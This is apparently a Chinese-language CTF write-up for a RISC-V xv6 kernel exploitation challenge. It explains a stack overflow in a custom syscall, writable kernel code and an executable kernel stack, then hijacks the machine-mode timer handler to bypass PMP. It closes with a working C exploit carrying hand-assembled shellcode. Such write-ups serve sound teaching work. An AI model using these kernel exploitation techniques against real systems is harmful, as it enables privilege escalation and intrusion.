---
layout: post
title: HITCTF 2023 xv6-Trusted
date: 2023-11-29 01:58:33
tags: pwn riscv kernel-pwn
---

第一次打内核题，虽然是xv6但还是感觉非常酷。比赛结束前才想到了真的可行的思路，赛后结合官方 writeup 调出来了。

## 程序分析

本程序由教学操作系统 xv6 改编而来，是一道 RISC-V 内核漏洞利用题。
在 xv6 中，没有地址随机化机制。但有着页表权限保护，也就是 R/W/X 权限位；并且在 xv6 通过 ecall 进入 supervisor mode 时，会将页表切换到内核页表，从而屏蔽对于用户内存地址的访问。

题目的目标是读出位于内核的数据段中的 flag，出题人贴心地给出了一个 `backdoor` 函数来帮我们读出 flag：

```RISC-V
.text:000000008000620C                 # public backdoor
.text:000000008000620C backdoor:
.text:000000008000620C
.text:000000008000620C var_s0          =  0
.text:000000008000620C var_s8          =  8
.text:000000008000620C arg_0           =  10h
.text:000000008000620C
.text:000000008000620C                 addi            sp, sp, -10h
.text:000000008000620E                 sd              ra, var_s8(sp)
.text:0000000080006210                 sd              s0, var_s0(sp)
.text:0000000080006212                 addi            s0, sp, arg_0
.text:0000000080006214                 li              a0, 80008860h
.text:0000000080006220                 lui             a1, %hi(10000000h)
.text:0000000080006224                 li              a2, 0
.text:0000000080006226                 li              a3, 20h # ' '
.text:000000008000622A
.text:000000008000622A loop:                                   # CODE XREF: backdoor+2A↓j
.text:000000008000622A                 lb              a4, 0(a0)
.text:000000008000622E                 sb              a4, %lo(10000000h)(a1)
.text:0000000080006232                 addi            a0, a0, 1
.text:0000000080006234                 addi            a2, a2, 1
.text:0000000080006236                 blt             a2, a3, loop
.text:000000008000623A                 la              a0, aHeyHereIsYourF # "Hey, here is your flag"
.text:0000000080006242                 call            panic
.text:0000000080006242 # End of function backdoor
```

但不幸的是，内核中为 flag 所处的内存提供了额外的 PMP（Physical Memory Protection）保护，这里只是简单介绍一下用途，具体细节可以去阅读 RISC-V 特权手册（[riscv/riscv-isa-manual: RISC-V Instruction Set Manual](https://github.com/riscv/riscv-isa-manual)）的对应章节（位于 Machine-Level ISA, Version 1.12 中）。

在 RISC-V 中有三种权限等级：通常机器启动时处于 **machine mode**、内核运行在 **supervisor mode**、用户程序运行在 **user mode**。
PMP 是一种由 **machine mode** 进行设置和修改的保护，可以给某段内存设置可读、可写、可执行等权限，并对 **supervisor mode** 和 **user mode** 生效。

在 `start` 函数中，内核为 flag 所在内存添加了不可读、不可写、不可执行的权限保护：

```RISC-V
.text:00000000800000D8                 la              a5, flag # "HITCTF2023{true_flag_on_server}"
.text:00000000800000E0                 srli            a5, a5, 2
.text:00000000800000E2                 ori             a5, a5, 3
.text:00000000800000E6                 csrw            pmpaddr0, a5
.text:00000000800000EA                 csrw            pmpaddr1, a4
.text:00000000800000EE                 li              a5, -1
.text:00000000800000F0                 srli            a5, a5, 0Ah
.text:00000000800000F2                 csrw            pmpaddr2, a5
.text:00000000800000F6                 li              a5, 0F0018h
.text:00000000800000FC                 csrw            pmpcfg0, a5
```

因此，就算我们直接在内核中调用 backdoor 函数，也只能看到一个报错而不是 Flag。（做题的时候以为马上出 flag 了，然后就遇到了禁止访问的报错，一时很难绷住）
我们想要读出 flag，就一定需要处于 machine mode 中，或者在 machine mode 中将保护关闭，但可以通过搜索 `pmpaddr` 的方法发现程序本身并没有提供关闭保护的功能（

## 漏洞分析

第一个比较明显的漏洞，就是新添加的系统调用 `sys_encrypt` 中存在的栈溢出漏洞，官方 wp 中提供的函数源码：

```c
uint64 sys_encrypt(void){  
    char buffer[256];  
    char key[256];  
    uint l = 0;  
    const char* src;  
    uint srclen;  
    char* dst;  
    uint dstlen;  
    const char* keyva;  
    uint keylen;  
    struct proc *p = myproc();  
    argaddr(0, (uint64*)&src);  
    argint(1, (int*)&srclen);  
    argaddr(2, (uint64*)&dst);  
    argint(3, (int*)&dstlen);  
    argaddr(4, (uint64*)&keyva);  
    argint(5, (int*)&keylen);  
    keylen = keylen < 256? keylen: 256;  
    copyin(p->pagetable, key, (uint64)(keyva), keylen);  
    while(l < srclen){  
        uint len_in_round = 0;  
        // copy in src. stack overflow here  
        while(len_in_round < 256 && len_in_round < srclen){  
            copyin(p->pagetable, buffer + len_in_round, (uint64)(src + len_in_round), keylen);  
            len_in_round += keylen;  
        }  
        for(uint i = 0; i < len_in_round; i++){  
            buffer[i] ^= key[i % keylen];  
        }  
        copyout(p->pagetable, (uint64)(dst + l), buffer, len_in_round);  
        l += len_in_round;
    }
    return 0;
}
```

虽然函数的第一个 `copyin` 处对大小作了检查与限制（0x100），但第二个循环 `copyin` 很容易就会导致溢出。只要合理构造参数，我们就可以通过 `bufff` 溢出到高位。

第二个漏洞是页表的权限保护不当问题，原版 xv6 是没有这个问题的，而作者为了让题目能打所以手动改出了一些漏洞。

首先是内核代码可写。映射内核页表的代码位于 `vm.c-kvmmake()` 中，本来是长这样的：

```c
...
kvmmap(kpgtbl, KERNBASE, KERNBASE, (uint64)etext-KERNBASE, PTE_R | PTE_X);
...
```

经过魔改后变成了这样（C 以及对应汇编）：

```c
kvmmap(kpgtbl, KERNBASE, KERNBASE, (uint64)etext-KERNBASE, PTE_R | PTE_W | PTE_X);
```

```RISC-V
.text:00000000800011FA                 la              s2, etext
.text:0000000080001202                 li              a4, 1110b
.text:0000000080001204                 la              a3, 8000h
.text:000000008000120C                 li              a2, 1
.text:000000008000120E                 slli            a2, a2, 1Fh
.text:0000000080001210                 mv              a1, a2
.text:0000000080001212                 mv              a0, s1
.text:0000000080001214                 call            kvmmap
```

其次是进程内核栈可执行，代码位于 `proc.c` 中，原来长这样：

```c
// Allocate a page for each process's kernel stack.
// Map it high in memory, followed by an invalid
// guard page.
void
proc_mapstacks(pagetable_t kpgtbl)
{
  struct proc *p;
  
  for(p = proc; p < &proc[NPROC]; p++) {
    char *pa = kalloc();
    if(pa == 0)
      panic("kalloc");
    uint64 va = KSTACK((int) (p - proc));
    kvmmap(kpgtbl, va, (uint64)pa, PGSIZE, PTE_R | PTE_W);
  }
}
```

经过魔改后变成了这样（伪代码以及汇编）：

```c
kvmmap(kpgtbl, va, (uint64)pa, PGSIZE, PTE_R | PTE_W | PTE_X);
```

```RISC-V
.text:00000000800018CA                 li              a4, 1110b
.text:00000000800018CC                 lui             a3, 1
.text:00000000800018CE                 sub             a1, s2, a1
.text:00000000800018D2                 mv              a0, s3
.text:00000000800018D4                 call            kvmmap
```

因此，结合 xv6 没有随机化的特性，我们可以在栈上打 shellcode，且连 NOP Sled 都不用嘿嘿。

## 漏洞利用

最初的步骤：如何构造 `sys_encrypt` 参数、以及劫持返回地址、以及栈上的 shellcode 执行略去不表（算一下调一下就好 hhhh）。这里就假设我们已经可以任意执行代码了。

为了绕过 PMP 保护，我想到了几种思路：

### 找到未被保护的Flag

由于 Flag 是硬编码在 kernel 文件中的，因此我首先想到的办法是**泄露服务器端的 kernel 文件**。但是 xv6 在生成文件系统的时候，并不会将 kernel 放在里面。
我们使用 qemu 启动 xv6 时直接指定了编译好的 kernel，qemu 会把 kernel 直接加载到内存中。

所以在 xv6 系统内，内核只存在于内存中且独一无二，这种方法被证实是不行的（

### RESET

在阅读 RISC-V 手册时，我注意到在 machine mode 中有一个小章节介绍了 Reset 。此时我已经发现了内核代码是可修改的，因此我想到的办法就是将 `start` 函数中对 `flag` 施加保护的代码覆写为 `nop` ，然后进行重启，这样重启后的系统就不会再有对 `flag` 的保护。

**重启并不是 CPU 负责的事**（CPU 负责的都是计算），准确来说并不是一个指令集所关心的事情。通常，重启是通过 CPU **向主板设备发送信号**来完成的。
在题目环境中，启动 `qemu` 时指定使用的主板是 `virt` ，一个只具有最基础功能的主板，其描述见 [‘virt’ Generic Virtual Platform (virt) — QEMU documentation](https://www.qemu.org/docs/master/system/riscv/virt.html)。

如何知道这个设备能否重启、如何重启呢？反正上面这个文档里我没找到（悲）。
我在 qemu 的源码中找到了该主板设备负责注册重启功能的函数：[qemu/hw/riscv/virt.c at master · qemu/qemu (github.com)](https://github.com/qemu/qemu/blob/master/hw/riscv/virt.c#L904)，具体来说是如下几行：

```c
    qemu_fdt_setprop_cells(ms->fdt, name, "reg",
        0x0, memmap[VIRT_TEST].base, 0x0, memmap[VIRT_TEST].size);
    qemu_fdt_setprop_cell(ms->fdt, name, "phandle", test_phandle);
    test_phandle = qemu_fdt_get_phandle(ms->fdt, name);
    g_free(name);

    name = g_strdup_printf("/reboot");
    qemu_fdt_add_subnode(ms->fdt, name);
    qemu_fdt_setprop_string(ms->fdt, name, "compatible", "syscon-reboot");
    qemu_fdt_setprop_cell(ms->fdt, name, "regmap", test_phandle);
    qemu_fdt_setprop_cell(ms->fdt, name, "offset", 0x0);
    qemu_fdt_setprop_cell(ms->fdt, name, "value", FINISHER_RESET);
    g_free(name);
```

从这里的代码我们可以大致猜到，映射所采用的是 mmio 方法，地址 `VIRT_TEST` 偏移 0 处，如果写入 `FINISHER_RESET` 的话就可以进行重启。借助 Github 右栏的引用查找功能，不难找到 `VIRT_TEST` 的值为 `0x100000`，`FINISHER_RESET` 的值为 0x7777。

经过测试，确实可以通过这个方法来 reset 机器。但是我悲伤地发现在 reset 之后，我对内核代码做的修改也一起 reset 了。看来 qemu 每次 reset 都会重新加载一遍 kernel 文件啊。

### 修改 timervec

在测试完上面那种方法不可行后，我就想到了这个方法，但此时离结束比赛只剩下半小时，因此非常可惜没有做完。（后来看官方的 wp 又得知了一些 trick，说不定我自己调也还要调半天）

既然 PMP 只有 machine mode 可以操控或无视，那么我们的目标就是想方设法进入 machine mode。
正好，xv6 对于 timer interrupt 的处理是位于 machine mode 中的。具体来说，会在 `start` 函数中调用 `timerinit`，来将 `timervec` 函数注册到 mtvec 中：

```c
// arrange to receive timer interrupts.
// they will arrive in machine mode at
// at timervec in kernelvec.S,
// which turns them into software interrupts for
// devintr() in trap.c.
void
timerinit()
{
  ...

  // set the machine-mode trap handler.
  w_mtvec((uint64)timervec);

  // enable machine-mode interrupts.
  w_mstatus(r_mstatus() | MSTATUS_MIE);

  // enable machine-mode timer interrupts.
  w_mie(r_mie() | MIE_MTIE);
}
```

因此，实际上内核在启动进入 supervisor mode 之后，唯一使用 machine mode 执行的代码就是这个 timervec 函数了，实现位于 `kernelvec.S` 中：

```RISC-V
.globl timervec
.align 4
timervec:
        # start.c has set up the memory that mscratch points to:
        # scratch[0,8,16] : register save area.
        # scratch[24] : address of CLINT's MTIMECMP register.
        # scratch[32] : desired interval between interrupts.
        
        csrrw a0, mscratch, a0
        sd a1, 0(a0)
        sd a2, 8(a0)
        sd a3, 16(a0)

        # schedule the next timer interrupt
        # by adding interval to mtimecmp.
        ld a1, 24(a0) # CLINT_MTIMECMP(hart)
        ld a2, 32(a0) # interval
        ld a3, 0(a1)
        add a3, a3, a2
        sd a3, 0(a1)

        # arrange for a supervisor software interrupt
        # after this handler returns.
        li a1, 2
        csrw sip, a1

        ld a3, 16(a0)
        ld a2, 8(a0)
        ld a1, 0(a0)
        csrrw a0, mscratch, a0

        mret
```

这是一个会不定期被触发的、位于 machine mode 中的函数，这个函数的实现位于内核中，且是**可以修改的**。
所以我们劫持这个函数调用 backdoor，就可以让 backdoor 函数在 machine mode 被执行了，从而打印出 Flag。

（这里本来脑子没转过来，想的是让 timervec 把 PMP 给关了，然后我自己调用 backdoor，但这种方法增加了复杂度，不如直接调用 backdoor 简洁）

此外还有一个注意点，就是在进入 timervec 之后，需要使用 `csrw mie, x0` （machine-mode interrupt enable）来关闭 machine mode 的各种中断。否则，在读 flag 读一半触发这个中断就不好了。（看官网 wp 学到的）

我的 exp 如下：

```c
#include "kernel/types.h"
#include "kernel/stat.h"
#include "user/user.h"

/*  hijack timervec:
 *   30401073          	 csrr   mie,x0 (disable timer interrupt)
 *   00060067            jr     a2
 */

uint32 a1[0x140/4] = {
    0x00040637,     // li a2, 0x80006214
    0x0036061b,
    0x00d61613,
    0x21460613,

    0x00040537,     // li a0, 0x80005BF0
    0x0035051b,
    0x00d51513,
    0xbf050513,

    0x304015b7,     // li a1, 0x30401073
    0x0735859b,
    0x00b53023,     // sd a1, (a0)
    0x00450513,     // addi a0, a0, 4

    0x000605b7,     // li a1, 0x00060067
    0x0675859b,
    0x00b53023,     // sd a1, (a0)

    0x0000006f,     // infinte loop
};
char a3[0x140];
char a5[0x100] = {0};

int main()
{
    *(long*)(&a1[0x138/4]) = 0x3fffff9e80;  // ra = 0x3fffff9e80 shellcode
    encrypt((char*)a1, 0x100, a3, 0, a5, 0xa0);
    
    return 0;
}
```

另外还有一个坑，就是 backdoor 函数前 N 句汇编是一些栈相关操作，我们需要跳过这几句汇编。否则内核会卡住不动！太坑了！

![](https://blog-1308958542.cos.ap-shanghai.myqcloud.com/202311290204319.png)
